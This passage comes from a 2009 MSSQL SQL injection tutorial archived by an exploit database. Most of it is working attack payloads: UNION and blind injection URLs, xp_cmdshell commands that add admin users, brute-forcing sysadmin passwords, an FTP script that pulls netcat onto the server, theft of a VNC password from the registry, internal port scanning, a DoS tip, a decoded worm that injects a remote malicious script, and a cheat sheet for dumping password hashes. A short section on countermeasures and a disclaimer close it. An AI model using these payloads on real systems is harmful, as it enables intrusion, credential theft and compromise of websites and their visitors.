		The ORDER BY position number 5 is out of range of the number of items in the select list.
		/showthread.asp, line 9
		------------------------------------------------------------------------------------

	This means this page select four columns from table and this error occurs when we request http://www.example.com/page.asp?id=1 order by 5--

	Now, we use UNION operator to gain information.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,44--
		[End SQLi]--------------------------------------------------------------------------

	We will see "11" or "22" or "33" or "44" appeared on some point in returned page. We assume that 
	we have already located the position which "44" occur on the screen.
	(We should remember this position because it is where our information will be appeared)

	As we found "44" on the screen, we replace "44" with "@@version" in order to find the version of MSSQL.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,@@version--
		[End SQLi]--------------------------------------------------------------------------

	We will see version of MSSQL appeared in the position which "44" occurred.

	At this point, we know that next information definitely takes place in this position.

		The rest are to find table names, column names and data. As we see in previous section, 
	we can obtain table names and column names through "information_schema" database.
	We still use the same way in this approach.
		
		[SQli]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables--
		[End SQLi]--------------------------------------------------------------------------

	We will see the first table on the screen. We assume it is table called 'threads'. We can find next table by following request.
		
		[SQli]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables where table_name not in ('threads')--
		[End SQLi]--------------------------------------------------------------------------

	We assume the retrieved table is 'users'. So, we append a known table list until we get blank in position which "44" occurred.
	After we get all table names that we want, we move to gather column names.
		
		[SQli]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users'--
		[End SQLi]--------------------------------------------------------------------------

	From this request, we will see the first column in table 'users'. We assume it is 'uname'. For another column, we can use following request.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users' and 
		column_name not in ('uname')--
		[End SQLi]--------------------------------------------------------------------------

	We get the second column which is 'upass' and we continue appending a known column list until we get blank result.
	The most wanted information is data. It is quite simple after we obtained table names and column names. We just use following request.
		
		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,uname from users--
		[End SQLi]--------------------------------------------------------------------------

	We will get data such as admin from the request. In order to get another row, we only append information list as following.

		[SQLi]------------------------------------------------------------------------------
		http://www.example.com/page.asp?id=1 and 1=2 UNION SELECT 11,22,33,uname from users where uname not in ('admin')--
		[End SQLi]--------------------------------------------------------------------------
	
	Now, we can enumerate the rest data.


###########################################
 [0x03] - MSSQL Blind SQL Injection Attack
###########################################

	
	In some case, Using normal sql injection is not work. Blind sql injection is another method which may help you.
The important point for blind sql injection is the difference between the valid and invalid query result.
You have to inject a statement to make query valid or invalid and observe the response.
	Just because you don't see any results, doesn't mean that your injected SQL is not being executed !!


	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x03a] - How to Test sites that are vulnerable in Blind SQL Injection
	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

		We assume that http://www.example.com/page.asp?id=1 is normal url to open web page.

	You can try to inject a statement like this

	http://www.example.com/page.asp?id=1 and 1=1	
	and
	http://www.example.com/page.asp?id=1 and 1=2

		If the results from these requests are different, it will be a good signal for you.
	This website may fall to blind sql injection vulnerability. When you put "id=1 and 1=1", 
	it means that the condition is true so, the response must be normal. 
	But the parameter "id=1 and 1=2" indicates that the condition is false 
	and if the webmaster does not provide a proper filter, the response absolutely differs from previous.


	++++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x03b] - Determine data through Blind SQL Injection
	++++++++++++++++++++++++++++++++++++++++++++++++++++++

		By using blind technique, you have to spend more time than normal injection. 
	You can obtain only one character while you send several queries to server.
	We will give you an example of querying the first character of database name. 
	We assume that database name is member. Therefore, the first character is "m" 
	which the ascii value is 109. (At this point, we assume that you know ascii code)

	Ok, first, we have to know that the results from requests have only 2 forms.

	1. Valid query result likes http://www.example.com/page.asp?id=1 and 1=1
	2. Invalid query result likes http://www.example.com/page.asp?id=1 and 1=2

	
	The following steps are up to each person. You idea may be different from our idea in order to pick ascii code to test query.

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

	In this situation, the result will be valid query result like http://www.example.com/page.asp?id=1 and 1=1 
	(because the first character of database name is "m" which ascii code is 109). Then, we try

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>120

	It is surely that the result will like http://www.example.com/page.asp?id=1 and 1=2 (because 109 absolutely less than 120).
	next, we try

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>105

	The result is a valid query result and at this point, the ascii value of first character of database name is between 105 and 120.
	So, we try

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>112  ===> invalid query result
	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>108  ===> valid query result
	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>110  ===> invalid query result
	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>109  ===> invalid query result

		You see that the first character of database name has an ascii value which is greater than 108 
	but is not greater than 109. Thus, we can conclude that the ascii value is equal to 109.
	You can prove with:
	
	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109 .
	
	We sure that the result is like the result of http://www.target.com/page.php?id=1 and 1=1 .

	The rest which you have to do is to manipulate some queries to collect your preferred information.
	In this tutorial, we propose some example queries in order to find the names of tables and columns in the database.


	++++++++++++++++++++++++++++++++++++++++++++
	 [0x03c] - Exploit query for get Table name 
	++++++++++++++++++++++++++++++++++++++++++++

		In order to get table name, we can use above method to obtain each character of table name.
	The only thing that we have to do is to change query to retrieve table name of current database. 
	As MSSQL does not have limit command. Therefore, the query is a bit complicate.

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) 
	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))
	AS varchar(8000)),1,1)),0)>97

		The above query is used to determine the first character of first table in current database. If we want to find second character of first table,
	we can do by following request:

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) 
	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))
	AS varchar(8000)),2,1)),0)>97

		We change the second parameter of substring function from 1 to 2 in order to specify preferred position of character in table name.
	Thus, if we want to determine other positions, we require only changing second parameter of substring function.

		In case of other tables, we can find other table names by changing the second select 
	from "SELECT TOP 1" to be "SELECT TOP 2" , "SELECT TOP 3" and so on. for example,

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) 
	FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 2 LOWER(name) FROM sysObjects WHERE xtYpe=0x55))
	AS varchar(8000)),1,1)),0)=97

		The above request will determine the first character of the second table name in current database.


	+++++++++++++++++++++++++++++++++++++++++++++
	 [0x03d] - Exploit query for get Column name 
	+++++++++++++++++++++++++++++++++++++++++++++

		After we obtain table names, the next target information is absolutely column names. 

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM 
	syscolumns i WHERE(i.colid<=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE 
	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),1,1)),0)>97

		In order to circumvent from magic quote filtering, you have to change 'tablename' 
	to be the form of concatenating char() command. for example, if table name is 'user', 
	when we put 'user' in the query, ' may be filtered and our query will be wrong.
	The solution is convert 'user' to be char(117)+char(115)+char(101)+char(114). 
	So, the query in where cluase changes from "Where name='user'" to "Where name=char(117)+char(115)+char(101)+char(114)".
	In this case, we can circumvent magic quote filtering. The result from the above request is the first character of the first column name of specific table.
	When we want to find the second character of the first column, we can use the same method as getting table name, by changing the second parameter of 
	substring function.

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM 
	syscolumns i WHERE(i.colid<=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE 
	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=1))AS varchar(8000)),2,1)),0)>97

	The above request is used to determine the second character of the first column name in specific table.
	In case of determining other columns, we can do by changing p.x value from 1 to 2,3,4 and so on. such as,

	http://www.example.com/page.asp?id=1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT p.name FROM (SELECT (SELECT COUNT(i.colid)rid FROM 
	syscolumns i WHERE(i.colid<=o.colid) AND id=(SELECT id FROM sysobjects WHERE name='tablename'))x,name FROM syscolumns o WHERE 
	id=(SELECT id FROM sysobjects WHERE name='tablename')) as p WHERE(p.x=2))AS varchar(8000)),1,1)),0)>97

	The first character of the second column name in specific table can be determined by the above request.


##############################################	
 [0x04] - More Dangerous SQL Injection Attack
##############################################
		
		In Chapter [0x02] and [0x03], We described about retrieving any useful data that was extracted from database 
	via SQL Injection techniques - for example, by performing a UNION Attack, Returning data in an error message and Blind injection. 
		This chapter will not show only an data extraction but command execution and sql worms as well.

	+++++++++++++++++++++++++++++++++++++++++++++++++++++
	 [0x04a] - Dangerous from Extended Stored Procedures
	+++++++++++++++++++++++++++++++++++++++++++++++++++++

		xp_cmdshell          - Executes a given command on the MSSQL Operation system
			             - Available by default on all MSSQL (Disabled on MSSQL 2005)
			             - Can only be executed by 'sa' and any other users with 'sysadmin' privileges
		
		xp_regxxx            - Read/Write registry keys, potentially including the Read SAM file
			
			xp_regread	
			xp_regwrite
			xp_regdeletekey
			xp_regdeletevalue
			xp_regenumkeys
			xp_regenumvalues

			[Example for determines what null-session shares are available on the server]
			exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares'
	
		xp_servicecontrol    - Allows to Manage Services
			
			[Example Command]--------------------------------------------------------------------
			exec master..xp_servicecontrol 'start','schedule'
			exec master..xp_servicecontrol 'start','server'
			[End Command]------------------------------------------------------------------------
		
		xp_availablemedia    - Reveals the available drives on the machine
		xp_dirtree	     - Allows a directory tree to be obtained
		xp_enumdsn	     - Enumerates ODBC data sources on the server
		xp_makecab	     - Allows the user to create a compressed archive of files on the server
		xp_ntsec_enumdomains - Enumerates domains that the server can access
		xp_terminate_process - Terminate a process (PID)
		xp_loginconfig	     - Login mode
	
	+++++++++++++++++++++++++++++++++++++++++++++
	 [0x04b] - Advanced SQL Injection Techniques
	+++++++++++++++++++++++++++++++++++++++++++++
		
		"xp_cmdshell" Stored procedures, executes any command shell in the server with the same permissions that it is currently running. 
	By default, only sysadmin is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp_configure) 

	EXEC master.dbo.xp_cmdshell 'net user cwh cwh1234 /add' ;--			//Use for add user "cwh" into system.
	EXEC master.dbo.xp_cmdshell 'net localgroup administrators cwh /add' ;--	//Use for escalating privilege "cwh" to admin group

	Example through SQL injection in a numeric field via a GET request:
	http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'

	On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:

	EXEC sp_configure 'show advanced options', 1;--
	RECONFIGURE;-- 
	EXEC sp_configure 'xp_cmdshell', 1;-- 
	RECONFIGURE;--  

	On MSSQL 2000:
	
	If you have 'sa' privileges but xp_cmdshell has been disabled/removed with sp_dropextendedproc, 
	we can simply inject the following code:

	EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--

		This creates a new stored procedure 'xp_anyname' linked to xp_log70.dll, which provides the xp_cmdshell functionality.
	If the previous code does not work, it means that the xp_log70.dll has been moved or deleted. In this case we need to inject the following code:

		CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
		DECLARE @result int, @OLEResult int, @RunResult int
		DECLARE @ShellID int
		EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
		IF @OLEResult <> 0 SELECT @result = @OLEResult
		IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
		EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
		IF @OLEResult <> 0 SELECT @result = @OLEResult
		IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
		EXECUTE @OLEResult = sp_OADestroy @ShellID
		return @result
	
	** Tip **

	[Question] 
		Determined that the web application connects to the DB with unprivileged account. 
	So we can't execute XP_CMDSHELL or access any interesting data ?

	[Answer]   
		It's not the end, First we must enumerate MSSQL user accounts that have system administrator privileges.

	[Code]--------------------------------------------------------------------------------------
	http://www.example.com/news.asp?id=1 union all select null,null,name,null,null,null,null from master..syslogins where name not in ('sa') and sysadmin=1;--
	[End Code]----------------------------------------------------------------------------------
		
	[Result]------------------------------------------------------------------------------------
	sa
	cwh
	example
	[End Result]--------------------------------------------------------------------------------
		
		We can use "OPENROWSET" to re-connect to the same database server under each enumerated 
	sysadmin account and guess passwords. This was automated via a Perl script to do brute-force password guessing through the SQL injection:
	
	[Code]--------------------------------------------------------------------------------------
	http://www.example.com/news.asp?id=1 union select * from openrowset('SQLoledb','server=VICTIMDBNAME;uid=$USER;pwd=$PASS','select * from master..sysusers')--
	[End Code]----------------------------------------------------------------------------------

	//Result: Found that "CWH" has a "1234"
		   
		Leveraged the "OPENDATASOURCE" function to execute a stored procedure on the database, under the "CWH" system administrator credentials:
	
	[Code]--------------------------------------------------------------------------------------
	http://www.example.com/news.asp?id=1; EXEC opendatasource('SQLoledb','Persist Security Info=False;DataSource=VICTIMDBNAME;UserID=CWH;Password=1234').master
	.dbo.xp_cmdshell 'net user hacklol 1234 /add';
	[End Code]----------------------------------------------------------------------------------

	//Dirty Attack: use TFTP Netcat and run a reverse shell. Gained Internet access to the internal network.

	
	= How about Upload of executables ? =

		Once we can use xp_cmdshell (either the native one or a custom one), we can easily upload executables on the target DB Server. 
	A very common choice is netcat.exe, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester's machine, 
	all that is needed is to inject the following queries: 
 
	exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
	exec master..xp_cmdshell 'echo USER >> ftpscript.txt';-- 
	exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
	exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
	exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
	exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
	exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--


	= How about Retrieving VNC Password from Registry ? =

	'; declare @out binary(8)
	exec master..xp_regread
	@rootkey = 'HKEY_LOCAL_MACHINE',
	@key = 'SOFTWARE\ORL\WinVNC3\Default',
	@value_name='password',
	@value = @out output
	select cast (@out as bigint) as x into TEMP--
	
	' and 1 in (select cast(x as varchar) from temp)--


	= How about Port Scanning ? =

		We can use SQL injection vulnerability as a rudimentary IP/Port Scanner of the Internal Network or Internet

	[Code]--------------------------------------------------------------------------------------
	http://www.example.com/news.asp?id=1 union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5',
	'select * from table')--
	[End Code]----------------------------------------------------------------------------------
		
			This Code will outbound the connection to 10.10.10.12 over port 80. If the port is closed, the timeout (5 seconds) 
		in parameter will be consumed and display error message:

			"SQL Server does not exist or access denied"

		If port is open, the timeout would not be consumed and error messages will returned:

			"General network error. Check your network documentation"
			or
			"OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error."
		
		This technique, We will be able to map open ports on the IP addresses of hosts on the internal network (w00t !!)

		** Note **
			This technique can use for Denial of Service (DoS). Just change port to some port such as: FTP (21), and change timeout too high (500).
		It's make many connections to target over FTP service (port 21)

	++++++++++++++++++++++++++++++++++++++
	 [0x04c] - Mass MSSQL Injection Worms
	++++++++++++++++++++++++++++++++++++++
		
		Recently, we came across a particularly interesting type of SQL Injection that, at times, can be quite difficult to clean, 
	even with the most robust database backup and recovery scheme. This attack is conducted with the help of an Internet robotÂ—also 
	known as malbotÂ—which attacks its prospects daily. It is likely that such a malbot fires the series of injection attempts continuously 
	and conditionally until the malicious script references are sensed on the targeted web pages. There is nothing new in the way that 
	the following T-SQL is injected. Yet, the generic nature of the script is somewhat interesting to see.

		
	[SQLi worm]---------------------------------------------------------------------------------
	';DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x4400450043004C004100520045002000400054002000760061007200630068006100720028003200350035
	0029002C0040004300200076006100720063006800610072002800320035003500290020004400450043004C0041005200450020005400610062006C0065005F004300
	7500720073006F007200200043005500520053004F005200200046004F0052002000730065006C00650063007400200061002E006E0061006D0065002C0062002E006E
	0061006D0065002000660072006F006D0020007300790073006F0062006A006500630074007300200061002C0073007900730063006F006C0075006D006E0073002000
	6200200077006800650072006500200061002E00690064003D0062002E0069006400200061006E006400200061002E00780074007900700065003D0027007500270020
	0061006E0064002000280062002E00780074007900700065003D003900390020006F007200200062002E00780074007900700065003D003300350020006F0072002000
	62002E00780074007900700065003D0032003300310020006F007200200062002E00780074007900700065003D003100AS%20NVARCHAR(4000));EXEC(@S);--
	[End SQLi]----------------------------------------------------------------------------------

		When we decode this SQLi Code with Hex:

	[SQLi Decoded]------------------------------------------------------------------------------

	DECLARE @T VARCHAR(255)
	DECLARE @C VARCHAR(255)

	DECLARE Table_Cursor CURSOR FOR
	SELECT [A].[Name], [B].[Name]
	FROM sysobjects AS [A], syscolumns AS [B]
	WHERE [A].[ID] = [B].[ID] AND
	
	[A].[XType] = 'U' /* Table (User-Defined) */ AND
	([B].[XType] = 99 /* NTEXT */ OR
	[B].[XType] = 35 /* TEXT */ OR
	[B].[XType] = 231 /* SYSNAME */ OR
	[B].[XType] = 167 /* VARCHAR */)
	
	OPEN Table_Cursor
	FETCH NEXT FROM Table_Cursor INTO @T,@C 
	
	WHILE (@@FETCH_STATUS = 0)
	
	BEGIN
	EXEC('UPDATE [' + @T + '] SET [' + @C + '] = RTRIM(CONVERT(VARCHAR, [' + @C + '])) + ''<script src="http://www.fengnima.cn/k.js"></script>''')
	FETCH NEXT FROM Table_Cursor INTO @T, @C
	END
	
	CLOSE Table_Cursor
	DEALLOCATE Table_Cursor 
	
	[End SQLi]----------------------------------------------------------------------------------

		What happens as a result? It finds all text fields in the database and adds a link to malicious javascript 
	<script src="http://www.fengnima.cn/k.js"></script> to each and every one of them which will make your website display them automatically. 
	So essentially what happened was that the attackers looked for ASP or ASPX pages containing any type of querystring (a dynamic value such as 
	an article ID, product ID, etc) parameter and tried to use that to upload their SQL injection code.


########################################	
 [0x05] - MSSQL Injection Cheat Sheet
########################################
 
		** Some of the queries in the table below can only be run by an admin (SA Privilege). 
	These are marked with "-- priv" at the end of the query. **

	+---------------+---------------------------------------------------------------------------+
	|    Version    | SELECT @@version							    |
	|---------------|---------------------------------------------------------------------------|
	|   Comments    | SELECT 1 -- comment							    |
	|               | SELECT /*comment*/1							    |
	|---------------|---------------------------------------------------------------------------|
	|		| SELECT user_name();							    |
	|               | SELECT system_user;							    |
	| Current User	| SELECT user;								    |
	|               | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID		    |
	|---------------|---------------------------------------------------------------------------|
	|  List Users   | SELECT name FROM master..syslogins					    |
	|---------------|---------------------------------------------------------------------------|
	|		| MSSQL2000: SELECT name, password FROM master..sysxlogins -- priv	    |
	|		|									    |
	|    		|	     SELECT name, master.dbo.fn_varbintohexstr(password)            |
	| 		|	     FROM master..sysxlogins -- priv				    |
	| List Password |									    |
	|    Hashes	| MSSQL2005: SELECT name, password_hash FROM				    |
	|		|	     master.sys.sql_logins -- priv				    |
	|    		|									    |
	|		|	     SELECT name + '-' +					    |
	|		|	     master.sys.fn_varbintohexstr(password_hash)		    |
	|		|	     FROM master.sys.sql_logins -- priv				    |
	|---------------|---------------------------------------------------------------------------|
	| 		| SELECT is_srvrolemember('sysadmin'); -- is your account a sysadmin?	    |
	|		| returns 1 for true, 0 for false, NULL for invalid role.		    |
	|		| Also try 'bulkadmin',	'systemadmin' and other values.			    |
	|   List DBA	| 									    |
	|   Accounts	|									    |
	| 		| SELECT is_srvrolemember('sysadmin', 'sa'); -- is sa a sysadmin?	    |
	|		| return 1 for true, 0 for false, NULL for invalid role/username.	    |
	|---------------|---------------------------------------------------------------------------|
	|   Current DB  | SELECT DB_NAME()							    |
	|---------------|---------------------------------------------------------------------------|
	|     List	| SELECT name FROM master..sysdatabases;				    |
	|   Databases	| SELECT DB_NAME(N); -- for N = 0, 1, 2, ...				    |
	|---------------|---------------------------------------------------------------------------|
	|		| SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE   |			    
	|		| name = 'mytable'); -- for the current DB only				    |
	|		|									    |
	| List Columns	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM  |
	|		| master..syscolumns, master..sysobjects WHERE				    |
	|		| master..syscolumns.id=master..sysobjects.id AND			    |
	|		| master..sysobjects.name='sometable'; -- list colum names		    |
	|		| and types for master..sometable					    |
	|---------------|---------------------------------------------------------------------------|
	|		| SELECT name FROM master..sysobjects WHERE xtype = 'U';		    |
	|		| (Use xtype = 'V' for views)						    |
	|		| SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';		    |
	|		|									    |
	|  List Tables	| SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype)	    |
	|		| FROM master..syscolumns, master..sysobjects WHERE			    |
	|		| master..syscolumns.id=master..sysobjects.id AND			    |
	|		| master..sysobjects.name='sometable'; -- list column names and types	    |
	|		| for master..sometable							    |
	|---------------|---------------------------------------------------------------------------|
	| 		| -- NB: This example works only for the current database.		    |
	|		| If you wan't to search another db, you need to specify the db name	    |
	|  Find Tables	| (e.g. replace sysobject with mydb..sysobjects).			    |
	|     From	|									    |
	|  Column Name	| SELECT sysobjects.name as tablename, syscolumns.name as columnname	    |
	|		| FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id	    |
	|		| WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%' --	    |
	|		| this lists table, column for each column containing the word 'password'   |
	|---------------|---------------------------------------------------------------------------|
	|    Select	| SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins	    |
	|    Nth Row	| ORDER BY name ASC) sq ORDER BY name DESC -- gets 9th row		    |
	|---------------|---------------------------------------------------------------------------|
	|Select Nth Char| SELECT substring('abcd', 3, 1) -- returns c				    |
	|---------------|---------------------------------------------------------------------------|
	|  Bitwise AND  | SELECT 6 & 2 -- returns 2						    |
	|		| SELECT 6 & 1 -- returns 0						    |
	|---------------|---------------------------------------------------------------------------|
	|  ASCII Value	| SELECT char(0x41) -- returns A					    |
	|   -> Char	|									    |
	|---------------|---------------------------------------------------------------------------|
	| Char -> ASCII | SELECT ascii('A') - returns 65					    |
	|     Value	|									    |
	|---------------|---------------------------------------------------------------------------|
	|    Casting    | SELECT CAST('1' as int);						    |
	|		| SELECT CAST(1 as char)						    |
	|---------------|---------------------------------------------------------------------------|
	|    String	| SELECT 'A' + 'B' - returns AB						    |
	| Concatenation |									    |
	|---------------|---------------------------------------------------------------------------|
	| If Statement  | IF (1=1) SELECT 1 ELSE SELECT 2 -- returns 1				    |
	|---------------|---------------------------------------------------------------------------|
	|Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END -- returns 1			    |
	|---------------|---------------------------------------------------------------------------|
	|Avoiding Quotes| SELECT char(65)+char(66) -- returns AB				    |
	|---------------|---------------------------------------------------------------------------|
	|  Time Delay   | WAITFOR DELAY '0:0:5' -- pause for 5 seconds				    |
	|---------------|---------------------------------------------------------------------------|
	|		| declare @host varchar(800); select @host = name FROM master..syslogins;   |
	|		| exec('master..xp_getfiledetails ''\\' + @host + '\c$\boot.ini''');	    |
	|		| -- nonpriv, works on 2000						    |
	|		|									    |
	|		| declare @host varchar(800); select @host = name + '-' +		    |
	|     Make	| master.sys.fn_varbintohexstr(password_hash) + '.2.pentestmonkey.net'	    |
	| DNS Requests	| from sys.sql_logins; exec('xp_fileexist ''\\' + @host + '\c$\boot.ini''');|
	|		| -- priv, works on 2005						    |
	|		|									    |
	|		| -- NB: Concatenation is not allowed in calls to these SPs, hence why we   |
	|		| have to use @host.  Messy but necessary.				    |
	|		| -- Also check out theDNS tunnel feature of sqlninja			    |
	|---------------|---------------------------------------------------------------------------|
	|    Command	| EXEC xp_cmdshell 'net user'; -- priv					    |
	|   Execution   |									    |
	|---------------|---------------------------------------------------------------------------|
	|     Local	| CREATE TABLE mydata (line varchar(8000));				    |
	|  File Access	| BULK INSERT mydata FROM 'c:\boot.ini';				    |
	|		| DROP TABLE mydata;							    |
	|---------------|---------------------------------------------------------------------------|
	| Hostname, IP  | SELECT HOST_NAME()							    |
	|---------------|---------------------------------------------------------------------------|
	| Create Users  | EXEC sp_addlogin 'user', 'pass'; -- priv				    |
	|---------------|---------------------------------------------------------------------------|
	|  Drop Users   | EXEC sp_droplogin 'user'; -- priv					    |
	|---------------|---------------------------------------------------------------------------|
	| Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv	    |
	+---------------+---------------------------------------------------------------------------+


########################################
 [0x06] - SQL Injection Countermeasures
########################################

	Main cause of SQL injection vulnerability is input validation. Many web developers do not provide
proper mechanism in order to sanitize any form of input. So, attackers take advantage of this point and gain access
to many databases. There are solutions to prevent SQL injection vulnerability.

	- Use whilelist input: because we cannot know all of bad inputs, so the efficient way is to allow only our known-valid input
	- Check input type: in some cases, attackers inject string into numeric input field or inject numeric into string input field, 
	  these may cause SQL injection vulnerability
	- Escape database metacharacters: use / in order to escape database metacharacters by prepending / in front of metacharaters.
	- Don't ignore any ways of input: attackers can manipulate input to exploit SQL vulnerabilities, so you must not care only query string but also headers, 
	  cookies and form fields as well
	- Use Parameterized Queries: MSSQL provides API for handling inputs which can help us to prevent SQL injection. 
	  This mechanism is called "Parameterized Queries".

			The following two code samples illustrate the difference between an unsafe query dynamically constructed out of 
		user data, and its safe parameterized counterpart. 
	
			In the first, the user-supplied name parameter is embeded directly into a SQL statement, leaving the 
		application vulnerable to SQL injection:

			//define the query structure
			string queryText = "select ename,sak from emp where ename ='";
		
			//concatenate the user-supplied name
			queryText += request.getParameter("name");
			queryText += "'";
		
			//execute the query
			stmt = con.createStatement();
			rs = stmt.executeQuery(queryText);
	
			In the second example, the query structure is defined using a question mark as a placeholder 
		for the user-supplied parameter. The prepareStatement method is invoked to interpret this, and fix the structure 
		of the query that is to be executed. Only then is the setString method used to specify the actual value of 
		the parameter. Because the query's structure has already been fixed, this value can contain any data at all, 
		without affecting the structure. The query is then executed safely:

			//define the query structure
			String queryText = "select ename,sal from emp where ename = ?";
		
			//prepare the statement through DB connection "con"
			stmt = con.prepareStatement(queryText);
		
			//add the user input to variable 1 (at the first ? placeholder)
			stmt.setSting(1, request.getParameter("name"));
		
			//execute the query
			rs = stmt.executeQuery();


#####################
 [0x07] - References
#####################

[1] Error based SQL injection - a true story: AnalyseR
[2] Advanced SQL Injection In SQL Server Applications: Chris Anley
[3] ASCII Encoded/Binary String Automated SQL Injection Attack: Michael Zino
[4] http://pentestmonkey.net
[5] http://www.owasp.org
[6] http://www.milw0rm.com

####################
 [0x08] - Greetz To
####################
	
Greetz	    : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK
Special Thx : asylu3, str0ke, citec.us, milw0rm.com

				----------------------------------------------------
	This paper is written for Educational purpose only. The authors are not responsible for any damage 
 originating from using this paper in wrong objective. If you want to use this knowledge with other person systems, 
				you must request for consent from system owner before
				----------------------------------------------------

# milw0rm.com [2009-01-29]
© Copyright 2017 Exploit Database
